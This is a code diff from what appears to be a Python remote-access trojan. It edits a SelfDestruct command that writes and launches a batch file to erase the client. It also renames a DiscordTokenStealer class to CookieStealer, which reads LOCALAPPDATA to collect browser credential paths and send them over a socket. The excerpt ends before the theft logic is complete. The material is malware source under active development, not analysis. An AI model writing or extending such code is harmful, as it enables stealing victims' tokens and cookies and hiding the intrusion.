@@ -836,7 +836,7 @@ class Shutdown(DoubleCommand):
 class SelfDestruct(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
-        import shared.command_consts
+        from shared.command_consts import SELF_DESTRUCT_TEMPLATE
         import subprocess
         import winreg
         import sys
@@ -863,10 +863,10 @@ class SelfDestruct(DoubleCommand):
         parent_dir = "/".join(os.path.split(__file__)[0].split("\\")[:-1])
         with open(f"{parent_dir}/self_destruct.bat", "w") as tmp_self_destruct_launcher:
             tmp_self_destruct_launcher.write(
-                shared.command_consts.SELF_DESTRUCT_TEMPLATE.format(pdir=parent_dir)
+                SELF_DESTRUCT_TEMPLATE.format(pdir=parent_dir)
             )
         subprocess.Popen(
-            f"cmd /c {parent_dir}/self_destruct.bat && del /f {parent_dir}/self_destruct.bat && taskkill /f /pid {os.getpid()} && exit"
+            f"cmd /c {parent_dir}/self_destruct.bat && del /f {parent_dir}/self_destruct.bat && exit"
         )
 
         sys.exit()
@@ -885,18 +885,17 @@ class SelfDestruct(DoubleCommand):
     [],
     str,
 )
-class DiscordTokenStealer(DoubleCommand):
+class CookieStealer(DoubleCommand):
     @staticmethod
     def client_side(sock: socket.socket) -> None:
-        from typing import Final
         import os
 
         tmp_sock = sock.dup()
         tmp_sock.setblocking(True)
         tmp_sock.settimeout(5)
 
-        LOCAL: Final[str] = os.getenv("LOCALAPPDATA") or ""
-        if len(LOCAL) == 0:
+        LOCAL = os.getenv("LOCALAPPDATA")
+        if LOCAL == None:
             return
 
         paths: dict[str, str] = {}
